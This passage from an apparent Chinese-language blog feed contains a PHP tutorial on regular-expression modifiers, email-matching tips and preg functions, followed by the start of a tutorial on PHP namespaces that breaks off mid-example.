class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>第二次，在正则表达示后面加上模式匹配符s:<font color="#FF6347">(2)↓↓</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/新的未来.+\d+/s'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"新的未来987654321"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$pattern</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span>运行结果：匹配到了，结果为：array<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span>22<span class="token punctuation">)</span> <span class="token string">"新的未来 987654321"</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>结论：</p><ol><li>因为在新的未来，未来后面有一个换行</li><li>而.(点)是匹配非空白字符以外的所有字符。因此，第一次不成功</li><li>第二次，加上了s模式匹配符。因为，加上后.（点）能匹配所有字符。</li></ol></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>4. x 忽略空白字符</strong></font></font></p><ol><li>如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略。</li><li>未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。</li></ol><ul><li><font color="#FF6347">(1)↓↓</font>我们先来实验一下忽略空白行等特性：</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/a b c /x'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">'学英语要从abc开始'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$pattern</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span>运行结果：匹配到了，结果为：array<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token string">"abc"</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这样也能匹配成功。<br>在$pattern里面有空格，每个abc后面有一个空格。而$string里面没有空格。<br>所以x忽略空白字符。</p></blockquote><ul><li><font color="#FF6347">(2)↓↓</font>而第二句话从字面上比较难理解：</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php//重点观察这一行<span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/a b c #我来写一个注释/x'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">'学英语要从abc开始'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$pattern</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span>运行结果：匹配到了，结果为：array<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token string">"abc"</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>结果也匹配成功了！<br>我们发现，<font color="red">x的第二个特性是忽略：#字符和下一个换行符之间的字符也被忽略</font>。</p></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>5. e 将匹配项找出来，进行替换</strong></font><br>e模式也叫逆向引用。主要的功能是将正则表达式括号里的内容取出来，放到替换项里面替换原字符串。<br>使用这个模式匹配符前必须要使用到<font color="#00B2EE"><strong>preg_replace()</strong></font>。<br><font color="red"><strong>mixed preg_replace ( mixed $正则表达式 , mixed $用于取代字符串的字串 , mixed $目标字符串)</strong></font><br><strong>preg_replace的功能：</strong>使用正则表达式 ，找到目标字符串。然后用’用于取代字符串的字串’进行替换。<br></font></p><p>在正式讲解前我们回顾一下之前的知识，我们故意的把每个要匹配的原子外面都加上括号：<font color="#FF6347">↓↓</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php//加上了括号<span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/(\d+)([a-z]+)(\d+)/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">'987abc321'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$pattern</span>, <span class="token variable">$string</span>, <span class="token variable">$match</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span>运行结果：匹配到了，结果为：array<span class="token punctuation">(</span>4<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span>9<span class="token punctuation">)</span> <span class="token string">"987abc321"</span> <span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token string">"987"</span> <span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token string">"abc"</span> <span class="token punctuation">[</span>3<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token string">"321"</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这是我们之前讲括号的时候：匹配到的内容外面有括号。会把括号里面的内容，也放到数组的元素里面。如图中的：987、abc、321。</p></blockquote><p>&emsp;<br>我们接下来看正则表达示中的e模式：<font color="#FF6347">↓↓</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"{April 15, 2003}"</span><span class="token punctuation">;</span>//<span class="token string">'w'</span>匹配字母，数字和下划线，<span class="token string">'d'</span>匹配0-99数字，<span class="token string">'+'</span>元字符规定其前导字符必须在目标对象中连续出现一次或多次<span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">"/{(\w+) (\d+), (\d+)}/i"</span><span class="token punctuation">;</span><span class="token variable">$replacement</span> <span class="token operator">=</span> <span class="token string">"\<span class="token variable">$2</span>"</span><span class="token punctuation">;</span>//字符串被替换为与第 n 个被捕获的括号内的子模式所匹配的文本<span class="token keyword">echo</span> preg_replace<span class="token punctuation">(</span><span class="token variable">$pattern</span>, <span class="token variable">$replacement</span>, <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>运行结果：15<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote></blockquote><p>结论：</p><ol><li>上例中$2 指向的是正则表达示的第一个(\d+)。相当于把15又取出来了</li><li>替换的时候，我写上$2。将匹配项取出来，用来再次替换匹配的结果。</li></ol><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>6. U 贪婪模式控制</strong></font><br>正则表达式默认是贪婪的，也就是尽可能的最大限度匹配。<br></font></p><p>我们来看看正则表达示是如何贪婪的：<font color="#FF6347">↓↓</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/&lt;div>.*&lt;\/div>/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"&lt;div>你好&lt;/div>&lt;div>我是&lt;/div>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$pattern</span>, <span class="token variable">$string</span>, <span class="token variable">$match</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>运行结果：匹配到了，结果为：array<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span>34<span class="token punctuation">)</span> <span class="token string">"你好我是"</span> <span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>我们来看看结果，得到如下结论。它从“<br>你好”直接匹配到了“我是<br>”。进行了最大范围的匹配。</p></blockquote><p>&emsp;<br>同样一段代码我们再加大写的U，再看看效果：<font color="#FF6347">↓↓</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/&lt;div>.*&lt;\/div>/U'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"&lt;div>你好&lt;/div>&lt;div>我是&lt;/div>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$pattern</span>, <span class="token variable">$string</span>, <span class="token variable">$match</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span>运行结果：匹配到了，结果为：array<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span>17<span class="token punctuation">)</span> <span class="token string">"你好"</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>我们发现，只匹配出来了：&lt;div&gt;你好&lt;/div&gt;<br>这样，把正则的贪婪特性取消掉。让它找到了最近的匹配，就OK了。</p></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>7. A 从目标字符串的开头开始匹配</strong></font><br>此模式类似于元字符中的^（抑扬符）效果。<br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/this/A'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">'hello this is a '</span><span class="token punctuation">;</span>//<span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token string">'this is a '</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$pattern</span>, <span class="token variable">$string</span>, <span class="token variable">$match</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>结论：</strong><br>   1.如果加A模式修正符的时候匹配不出来$string，不加时能匹配出来<br>   2.如果加上了A模式修正符的时候能匹配出来$string1,因为必须要从开始处开始匹配</p></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>8. D 结束$符后不准有回车</strong></font><br>如果设定了此修正符，模式中的美元元字符仅匹配目标字符串的结尾。没有此选项时，如果最后一个字符是换行符的话，美元符号也会匹配此字符之前。<br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/\w+this$/'</span><span class="token punctuation">;</span> <span class="token variable">$pattern1</span> <span class="token operator">=</span> <span class="token string">'/\w+this$/D'</span><span class="token punctuation">;</span> <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"hellothis "</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$pattern1</span>, <span class="token variable">$string</span>, <span class="token variable">$match</span><span class="token punctuation">))</span> <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span> var_dump<span class="token punctuation">(</span><span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>else <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> ?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>结论：</strong><br>1.如pattern 在匹配$string的时候，$string的字符串this后有一个回车。在没有加D匹配符的时候也能匹配成功<br>2.如pattern 在匹配$string的时候，加上了D。$string的字符串this后有空格，匹配不成功。</p></blockquote><p>&emsp;</p><h4 id="7-写正则的诀窍和常用正则"><font face="Comic sans MS" color="#FF6347">7. 写正则的诀窍和常用正则</font><a href="post/PHP-Regular-Expression#7-写正则的诀窍和常用正则"></a></h4><p><font face="Comic sans MS">写正则的诀窍</font><br>女孩和男孩恋爱时的诀窍通常是：测试你是不是对我好一点，如果是的，咱们的关系就更好一点。<br>而正则的诀窍和恋爱的诀窍基本一致：<font color="red">写一点、测一点。</font><br>因为，<strong>我们需要不断的正则，用preg_match对比是不是能匹配成功。成功了，再写后面的一点。直到写完，全部匹配成功为止！</strong><br><font face="Comic sans MS">例如，我要写一个邮箱的正则。我先要做的事情，将常用的邮箱格式全部列出来。例如：<br><a href="mailto:phpcn@php.cn" target="_blank" rel="noopener">phpcn@php.cn</a> &emsp; <a href="mailto:phpcn@corp.baidu.cm" target="_blank" rel="noopener">phpcn@corp.baidu.cm</a> &emsp; <a href="mailto:phpcn@126.com" target="_blank" rel="noopener">phpcn@126.com</a>  &emsp;<a href="mailto:phpcn@xxx.com" target="_blank" rel="noopener">phpcn@xxx.com</a>  &emsp;<a href="mailto:12345@qq.com" target="_blank" rel="noopener">12345@qq.com</a><br></font></p><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">  常用的格式主要有这样一些。那我们就可以来分析：    1.先匹配@之前的字符 \w+（因为是0-9A-Za-z_）    2.第二个跟一个@符    3.第三个再写上[a-zA-Z0-9-]+ 因为qq和126这些主域名是不能有下划线的    4.corp.baidu. 或者是126. 通常邮箱后缀都是这样的。所以我们可以写成：([a-zA-Z0-9-]+.){1,2}    5.上面的是将 **.** 转义，让它是本身的意思。括号重复的区间最少一次，最多两次。    6.后面接下com|cn|org|gov.cn|net|edu.cn等就可以了</font></td></tr></table></div></div><p>因此，我们的正则表达式我使用：<br>/\w+@([a-zA-Z0-9-]+.){1,2}(com|cn|org|gov.cn|net|edu.cn)/<br>或<br>/\w+@([a-zA-Z0-9_]+)\.(com|cn|org|gov.cn|net|edu.cn)/<br>邮箱的正则就被我写成功了。ฅʕ•̫͡•ʔฅ</p><p>&emsp;</p><h4 id="8-常用正则函数"><font face="Comic sans MS" color="#FF6347">8. 常用正则函数</font><a href="post/PHP-Regular-Expression#8-常用正则函数"></a></h4><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">函数名</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">preg_filter</td><td align="left">执行一个正则表达式搜索和替换</td></tr><tr><td align="center">preg_grep</td><td align="left">返回匹配模式的数组条目</td></tr><tr><td align="center">preg_match</td><td align="left">执行一个正则表达式匹配</td></tr><tr><td align="center">preg_match_all</td><td align="left">执行一个全局正则表达式匹配</td></tr><tr><td align="center">preg_replace_callback_array</td><td align="left">传入数组，执行一个正则表达式搜索和替换使用回调</td></tr><tr><td align="center">preg_replace_callback</td><td align="left">执行一个正则表达式搜索并且使用一个回调进行替换</td></tr><tr><td align="center">preg_replace</td><td align="left">执行一个正则表达式的搜索和替换</td></tr><tr><td align="center">preg_split</td><td align="left">通过一个正则表达式分隔字符串</td></tr></tbody></table></div></div><p>&emsp;<br><strong>正则关于面试常遇到的问题</strong><br>面试中经常考到的几个正则达达示是：</p><ol><li>匹配邮箱</li><li>匹配手机号</li><li>匹配一个网址</li><li>用正则匹配某个格式，取出某个例</li><li>写一个采集器<br>其他….</li></ol><p>面试的第4题和第5题我对大家不担心，因为只要大家认真学习了我给的前五节的内容。第4，5题推理就行。<br>因为，通常在技术答题面试环节，是时候准许查手机的！  ヾ(๑╹◡╹)ﾉ”</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-命名空间</title>
      <link href="/post/PHP-namespace/"/>
      <url>/post/PHP-namespace/</url>
      
        <content type="html"><![CDATA[<p>(oﾟvﾟ)ノ</p><a id="more"></a><blockquote><blockquote><p><font color="red">如果没有定义任何命名空间，所有的类与函数的定义都是在全局空间</font>，与 PHP 引入命名空间概念前一样。在名称前加上前缀 \ 表示该名称是全局空间中的名称，即使该名称位于其它的命名空间中时也是如此。对于函数和常量来说，如果当前命名空间中不存在该函数或常量，PHP 会退而使用全局空间中的函数或常量。</p></blockquote></blockquote><blockquote><blockquote><p><font color="#00B2EE"><strong>名称解析遵循下列规则：</strong></font></p><ol><li>对完全限定名称的函数，类和常量的调用在编译时解析。例如 new \A\B 解析为类 A\B。</li><li>所有的非限定名称和限定名称（非完全限定名称）根据当前的导入规则在编译时进行转换。例如，如果命名空间 A\B\C 被导入为 C，那么对 C\D\e() 的调用就会被转换为 A\B\C\D\e()。</li><li>在命名空间内部，所有的没有根据导入规则转换的限定名称均会在其前面加上当前的命名空间名称。例如，在命名空间 A\B 内部调用C\D\e()，则 C\D\e() 会被转换为 A\B\C\D\e() 。</li><li>非限定类名根据当前的导入规则在编译时转换（用全名代替短的导入名称）。例如，如果命名空间 A\B\C 导入为C，则 new C() 被转换为 new A\B\C() 。</li><li>在命名空间内部（例如A\B），对非限定名称的函数调用是在运行时解析的。例如对函数 foo() 的调用是这样解析的：<br>(1). 在当前命名空间中查找名为 A\B\foo() 的函数<br>(2). 尝试查找并调用 全局(global) 空间中的函数 foo()。</li><li>在命名空间（例如A\B）内部对非限定名称或限定名称类（非完全限定名称）的调用是在运行时解析的。下面是调用 new C() 及 new D\E() 的解析过程： new C()的解析:<br>(1). 在当前命名空间中查找A\B\C类。<br>(2). 尝试自动装载类A\B\C。<br><font color="red">new D\E()的解析:</font><br>(1). 在类名称前面加上当前命名空间名称变成：A\B\D\E，然后查找该类。<br>(2). 尝试自动装载类 A\B\D\E。<br>为了引用全局命名空间中的全局类，必须使用完全限定名称 new \C()。</li></ol></blockquote></blockquote><hr><hr><p>&emsp;<br>&emsp;</p><p><font face="Comic sans MS">对于命名空间，官方文档已经说得很详细<font color="red">[<a href="http://www.php.net/manual/zh/language.namespaces.rationale.php" target="_blank" rel="noopener">查看</a>]</font>，我在这里做了一下实践和总结。<br><font color="red">命名空间一个最明确的目的就是解决<strong>重名问题</strong></font>，PHP中不允许两个函数或者类出现相同的名字，否则会产生一个致命的错误。这种情况下只要避免命名重复就可以解决，<font color="red">最常见的一种做法是约定一个前缀</font>。</font></p><p>例：项目中有两个模块：article和message board，它们各自有一个处理用户留言的类Comment。之后我可能想要增加对所有用户留言的一些信息统计功能，比如说我想得到所有留言的数量。这时候调用它们Comment提供的方法是很好的做法，但是同时引入各自的Comment类显然是不行的，代码会出错，在另一个地方重写任何一个Comment也会降低维护性。那这时只能重构类名，我约定了一个命名规则，在类名前面加上模块名，像这样：Article_Comment、MessageBoard_Comment</p><p>可以看到，名字变得很长，那意味着以后使用Comment的时候会写上更多的代码（至少字符多了）。并且，以后如果要对各个模块增加更多的一些整合功能，或者是互相调用，发生重名的时候就需要重构名字。当然在项目开始的时候就注意到这个问题，并规定命名规则就能很好的避免这个问题。<font color="red">另一个解决方法可以考虑使用命名空间。</font></p><p>&emsp;<br><font color="#00B2EE"><strong>注明：</strong></font><br>本文提到的常量：PHP5.3开始const关键字可以用在类的外部。const和define都是用来声明常量的（它们的区别不详述），<font color="red">但是在命名空间里，define的作用是全局的，而const则作用于当前空间。</font>我在文中提到的常量是指使用const声明的常量。</p><p><font color="#00B2EE"><strong>基础：</strong></font><br>命名空间将代码划分出不同的空间（区域），每个空间的常量、函数、类（为了偷懒，我下边都将它们称为元素）的名字互不影响， 这个有点类似我们常常提到的‘封装’的概念。<br>创建一个命名空间需要使用namespace关键字，这样：<br></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php//创建一个名为<span class="token string">'Article'</span>的命名空间namespace Article<span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="red"><strong>要注意的是，当前脚本文件的第一个命名空间前面不能有任何代码，下面的写法都是错误的：</strong></font></p><pre class="line-numbers language-bash"><code class="language-bash">//例一//在脚本前面写了一些逻辑代码<span class="token operator">&lt;</span>?php<span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string">"/"</span><span class="token punctuation">;</span>class Comment <span class="token punctuation">{</span> <span class="token punctuation">}</span>namespace Article<span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">//例二//在脚本前面输出了一些字符<span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span><span class="token operator">&lt;</span>?phpnamespace Article<span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为什么要说第一个命名空间呢？<font color="red">因为同一脚本文件中可以创建多个命名空间。</font><br>下面我创建了两个命名空间，顺便为这两个空间各自添加了一个Comment类元素：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//创建一个名为'Article'的命名空间</span><span class="token keyword">namespace</span> <span class="token package">Article</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//此Comment属于Article空间的元素</span><span class="token keyword">class</span> <span class="token class-name">Comment</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//创建一个名为'MessageBoard'的命名空间</span><span class="token keyword">namespace</span> <span class="token package">MessageBoard</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//此Comment属于MessageBoard空间的元素</span><span class="token keyword">class</span> <span class="token class-name">Comment</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><strong>在不同空间之间不可以直接调用其它元素，需要使用命名空间的语法：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Article</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Comment</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">MessageBoard</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Comment</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//调用当前空间（MessageBoard）的Comment类</span><span class="token variable">$comment</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Comment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//调用Article空间的Comment类</span><span class="token variable">$article_comment</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>Article<span class="token punctuation">\</span>Comment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><blockquote><p>可以看到，在MessageBoard空间中调用article空间里的Comment类时，使用了一种像文件路径的语法： \空间名\元素名<br>除了类之外，对函数和常量的用法是一样的，下面我为两个空间创建了新的元素，并在MessageBoard空间中输出了它们的值。</p></blockquote></blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpnamespace Article<span class="token punctuation">;</span>const PATH <span class="token operator">=</span> <span class="token string">'/article'</span><span class="token punctuation">;</span><span class="token keyword">function</span> getCommentTotal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> 100<span class="token punctuation">;</span><span class="token punctuation">}</span>class Comment <span class="token punctuation">{</span> <span class="token punctuation">}</span>namespace MessageBoard<span class="token punctuation">;</span>const PATH <span class="token operator">=</span> <span class="token string">'/message_board'</span><span class="token punctuation">;</span><span class="token 